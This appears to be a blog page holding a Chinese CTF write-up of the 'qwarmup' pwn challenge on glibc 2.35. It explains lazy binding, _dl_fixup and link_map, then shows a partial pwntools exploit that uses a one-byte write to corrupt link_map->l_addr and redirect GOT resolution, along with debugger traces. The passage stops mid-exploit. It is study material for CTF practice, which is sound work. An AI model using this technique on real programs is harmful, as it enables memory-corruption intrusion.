<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/23/dl_runtime_resolve%20attack+svcudp_reply%E6%8E%A7%E5%88%B6%E6%A0%88/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/23/dl_runtime_resolve%20attack+svcudp_reply%E6%8E%A7%E5%88%B6%E6%A0%88/" class="post-title-link" itemprop="url">dl_runtime_resolve attack+svcudp_reply控制栈</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-08-23 00:40:46 / Modified: 00:44:06" itemprop="dateCreated datePublished" datetime="2022-08-23T00:40:46+08:00">2022-08-23</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>15k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>14 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>qwarmup 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.35</span><span class="number">-0u</span>buntu3)</span> stable release version 2.35.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  qwarmup file qwarmup          </span><br><span class="line">qwarmup: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">0</span>ee74cf51da29e8ecc9897c2a2a96b4ce87934be, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">➜  qwarmup checksec qwarmup      </span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/桌面/qwarmup/qwarmup&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，开了 NX，开了 PIE，开了 Canary，但是 GOT 可改（启用了延迟绑定）</li>
</ul>
<p>有沙盒</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  qwarmup seccomp-tools dump ./qwarmup1 </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x08</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x0000000c</span>  <span class="keyword">if</span> (A == brk) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x0000003c</span>  <span class="keyword">if</span> (A == <span class="built_in">exit</span>) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A == exit_group) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br></pre></td></tr></table></figure>
<ul>
<li>只能打 ORW</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> key; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> byte; <span class="comment">// [rsp+7h] [rbp-19h] BYREF</span></span><br><span class="line">  __int64 offset; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  _BYTE *chunk; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init_s();</span><br><span class="line">  read(<span class="number">0</span>, &amp;size, <span class="number">4uLL</span>);</span><br><span class="line">  chunk = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !chunk )</span><br><span class="line">    _Exit(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    offset = <span class="number">0LL</span>;</span><br><span class="line">    byte = <span class="number">0</span>;</span><br><span class="line">    read(<span class="number">0</span>, &amp;offset, <span class="number">8uLL</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;byte, <span class="number">1uLL</span>);</span><br><span class="line">    chunk[offset] = byte;                       <span class="comment">// 溢出？</span></span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Success!&quot;</span>, <span class="number">8uLL</span>);</span><br><span class="line">    HIWORD(key) = HIWORD(size);                 <span class="comment">// 大于0x10000的部分赋值key</span></span><br><span class="line">    LOWORD(key) = <span class="number">0</span>;                            <span class="comment">// 小于0x10000的部分置空</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( !key );</span><br><span class="line">  _Exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>题目中会检查 size：<ul>
<li>如果 size 小于0x10000，可以循环写</li>
<li>如果 size 大于0x10000，只能写一次</li>
</ul>
</li>
</ul>
<p><strong>了解延迟绑定的细节</strong></p>
<p>延迟绑定机制：</p>
<ul>
<li>启用延迟绑定后，程序不会把库函数的真实地址绑定在 GOT 表中</li>
<li>当程序第一次调用该函数时，会先找到该函数对应的 PLT 表，然后跳转对应的 GOT 表</li>
<li>GOT 表中没有该函数的真实地址，而是会跳转回 PLT 表</li>
<li>在 PLT 表中：先 push 一个偏移（用于确定自身函数），然后在 PLT 表中进入共用的 PLT[0] 表</li>
<li>在 PLT[0] 表中：先 push <code>link_map</code>（为 <code>_dl_fixup</code> 提供信息），然后执行 <code>_dl_runtime_resolve_fxsave</code> 函数</li>
<li>接着使用 <code>_dl_fixup</code> 函数来查找目标在动态链接库中的地址</li>
<li>最后把对应 GOT 表地址修改为库函数的真实地址</li>
</ul>
<p><code>_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg)</code> 接受两个参数，一个“链接映射”和一个“重定位索引”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;		<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">				   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="keyword">char</span> *l_name;		<span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;		<span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>“链接映射”：将有关 ELF 的所有相关信息包装成一个非常简洁的数据结构 <code>link_map</code></li>
<li>“重定位索引”：用于确定该函数在 PLT/GOT 表中的位置</li>
</ul>
<p>它将使用“链接映射”来确定“重定位索引”所指的符号，并提供大量其他需要的信息来进行符号解析，其中最重要的就是“解析地址”计算</p>
<ul>
<li><code>_dl_fixup</code> 利用存储在 <code>link_map</code> 中的信息来确定符号 <code>@got</code>（称为“解析地址”）的位置</li>
<li>如果我们欺骗 <code>_dl_fixup</code> 计算错误的解析地址并且 <code>write@got</code> 仍然是 <code>write@plt+6</code>，利用这一点将是有价值的，我们永远不会在字节写入后丢失 <code>_dl_fixup</code> 作为攻击面</li>
</ul>
<p>实现重定位的代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *)(D_PTR(l, l_info[DT_JMPREL]) + reloc_offset(pltgot, reloc_arg));</span><br><span class="line"><span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br></pre></td></tr></table></figure>
<p>当运行时加载器加载 ELF 时，它会通过 .dynamic 部分中的条目定位不同的数据结构，例如存储析构函数或 GOT 的位置，这是 .dynamic 部分的样子：</p>
<p><img src="/2022/08/23/dl_runtime_resolve%20attack+svcudp_reply%E6%8E%A7%E5%88%B6%E6%A0%88/1661098830166.png" alt="1661098830166"> </p>
<p>.dynamic 段中往往保存着多个元素，元素的数据结构为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf64_Xword d_val;		<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure>
<ul>
<li>d_tag：标签所做的只是描述值，告诉加载器 <code>d_un</code> 数据的意义，常见的类型如下表：</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th><code>d_tag</code>类型</th>
<th><code>d_un</code>的定义</th>
</tr>
</thead>
<tbody>
<tr>
<td>DT_SYMTAB - 6</td>
<td>d_ptr 记录动态链接符号表(.dynsym)的地址偏移</td>
</tr>
<tr>
<td>DT_STRTAB - 5</td>
<td>d_ptr 记录动态链接字符串表(.dynstr)的地址偏移</td>
</tr>
<tr>
<td>DT_STRSZ - 10</td>
<td>d_val 记录动态链接字符串表(.dynstr)的大小</td>
</tr>
<tr>
<td>DT_HASH - 4</td>
<td>d_ptr 表示动态链接hash表(.hash)的地址</td>
</tr>
<tr>
<td>DT_SONAME - 14</td>
<td>本共享对象的SO-NAME</td>
</tr>
<tr>
<td>DT_RPATH - 15</td>
<td>动态链接共享对象的搜索路径</td>
</tr>
<tr>
<td>DT_INIT - 12</td>
<td>初始化代码地址</td>
</tr>
<tr>
<td>DT_FINIT - 13</td>
<td>结束代码地址</td>
</tr>
<tr>
<td>DT_NEED - 1</td>
<td>当前文件依赖的共享目标文件的文件名</td>
</tr>
<tr>
<td>DT_REL/DT_RELA - 17/7</td>
<td>动态链接重定位表地址</td>
</tr>
<tr>
<td>DT_RELAENT - 9</td>
<td>动态链接重定位表项的数目</td>
</tr>
</tbody>
</table>
</div>
<p>运行时，加载器将读取每个 Elf64_Dyn 条目，并在 ELF 的 <code>link_map</code> 中存储指向每个条目的指针（具体来说，指向每个 Elf64_Dyn 的指针将存储在 <code>link_map-&gt;l_info</code> 数组中，由标签索引）</p>
<ul>
<li>因此，加载器可以使用 <code>l-&gt;l_info[DT_FINI]</code> 访问对应的 Elf64_Dyn </li>
<li>那么，就可以通过 <code>l-&gt;l_info[DT_FINI].d_un.d_ptr</code> 轻松读取 <code>DT_SYMTAB DT_SYMTAB</code> 的地址</li>
</ul>
<p>接下来就需要 [重定位表] 来索引目标的位置，每个条目都有一个 <code>r_offset</code> 属性，它指定符号的解析地址应该放在哪里：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword	r_addend;		<span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure>
<p>看了下面这张图就明白了：</p>
<p><img src="/2022/08/23/dl_runtime_resolve%20attack+svcudp_reply%E6%8E%A7%E5%88%B6%E6%A0%88/1661100223655.png" alt="1661100223655"> </p>
<ul>
<li>由于 <code>r_offset</code> 属性是一个偏移量而不是一个绝对指针，我们需要添加 <code>l-&gt;l_addr</code> 来获得解析地址，也就是如下代码的实现：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>当申请的堆块足够大时，可以申请到接近 libc 前面内存，有一次 WAA libc 的机会（只有1字节）</p>
<p>根据 <code>_dl_fixup_</code> 的寻址规则，我们在 <code>_dl_fixup_</code> 查找完函数地址回填到 GOT 表后，可以通过修改 <code>link_map-&gt;l_addr</code>，使回填的函数填到 <code>write@got</code> 某个偏移的地方（<code>bss-&gt;size</code>）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*RDI  <span class="number">0x7fcefdddf2e0</span> —▸ <span class="number">0x55a47f540000</span> ◂— <span class="number">0x10102464c457f</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7fcefdddf2e0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdi <span class="number">0x7fcefdddf2e0</span> —▸ <span class="number">0x55a47f540000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fcefdddf2e8</span> —▸ <span class="number">0x7fcefdddf888</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7fcefdddf2f0</span> —▸ <span class="number">0x55a47f543df8</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7fcefdddf2f8</span> —▸ <span class="number">0x7fcefdddf890</span> —▸ <span class="number">0x7ffdfdf5b000</span> ◂— jg     <span class="number">0x7ffdfdf5b047</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7fcefdddf300</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7fcefdddf308</span> —▸ <span class="number">0x7fcefdddf2e0</span> —▸ <span class="number">0x55a47f540000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7fcefdddf310</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x7fcefdddf318</span> —▸ <span class="number">0x7fcefdddf870</span> —▸ <span class="number">0x7fcefdddf888</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance <span class="number">0x7fcefda86000</span> <span class="number">0x7fcefdddf2e0</span></span><br><span class="line"><span class="number">0x7fcefda86000</span>-&gt;<span class="number">0x7fcefdddf2e0</span> is <span class="number">0x3592e0</span> bytes (<span class="number">0x6b25c</span> words)</span><br></pre></td></tr></table></figure>
<p>示例代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">offset, <span class="built_in">bytes</span>, tag=<span class="literal">True</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">bytes</span>):</span><br><span class="line">        p.send(p64(offset + i))</span><br><span class="line">        p.send(p8(byte))</span><br><span class="line">        <span class="keyword">if</span> tag:</span><br><span class="line">            p.recvuntil(<span class="string">b&quot;Success!&quot;</span>)</span><br><span class="line"></span><br><span class="line">link_map_offset = <span class="number">0x3592e0</span> - <span class="number">0x10</span> <span class="comment"># 通过mmap申请的chunk与link_map之间的偏移</span></span><br><span class="line">p.send(p32(<span class="number">0xf0000</span>))</span><br><span class="line">size_addr = <span class="number">0x408c</span> <span class="comment"># 位于bss段的size</span></span><br><span class="line"></span><br><span class="line">write(link_map_offset, p8(size_addr-<span class="number">4</span> - elf.got[<span class="string">&quot;write&quot;</span>]))</span><br></pre></td></tr></table></figure>
<ul>
<li>执行覆盖的汇编代码：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*RAX  <span class="number">0x70</span> <span class="comment">/* 计算出来的,用于覆盖link_map-&gt;l_addr末尾的值 */</span></span><br><span class="line"> RDX  <span class="number">0x7f9e9d9ee2e0</span> —▸ <span class="number">0x556d291fe000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"></span><br><span class="line"> ► <span class="number">0x556d291ff4bb</span>    mov    byte ptr [rdx], al</span><br></pre></td></tr></table></figure>
<ul>
<li>修改前：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f9e9d695000</span>+<span class="number">0x3592e0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f9e9d9ee2e0</span> —▸ <span class="number">0x556d291fe000</span> ◂— <span class="number">0x10102464c457f</span> <span class="comment">/* link_map-&gt;l_addr */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f9e9d9ee2e8</span> —▸ <span class="number">0x7f9e9d9ee888</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7f9e9d9ee2f0</span> —▸ <span class="number">0x556d29201df8</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7f9e9d9ee2f8</span> —▸ <span class="number">0x7f9e9d9ee890</span> —▸ <span class="number">0x7ffec7501000</span> ◂— jg     <span class="number">0x7ffec7501047</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f9e9d9ee300</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7f9e9d9ee308</span> —▸ <span class="number">0x7f9e9d9ee2e0</span> —▸ <span class="number">0x556d291fe000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7f9e9d9ee310</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7f9e9d9ee318</span> —▸ <span class="number">0x7f9e9d9ee870</span> —▸ <span class="number">0x7f9e9d9ee888</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>修改后：</li>
</ul>
